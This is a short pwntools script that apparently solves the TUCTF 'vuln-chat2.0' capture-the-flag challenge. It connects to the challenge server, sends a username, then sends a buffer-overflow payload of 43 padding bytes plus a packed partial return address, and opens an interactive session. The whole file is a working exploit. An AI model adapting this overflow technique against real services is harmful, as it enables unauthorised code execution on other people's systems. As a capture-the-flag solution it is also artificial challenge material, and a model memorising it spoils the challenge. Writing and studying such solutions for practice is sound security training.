#!/usr/bin/env python
from pwn import *

#m = process('vuln-chat2.0')
host, port = 'vulnchat2.tuctf.com', 4242
m = remote(host,port)

m.recvuntil('username: ')
m.sendline('aloha')
#sleep(1)
m.recvuntil(': ')
payload = 'a'*43 + p32(0x8672)
m.sendline(payload)
m.interactive()

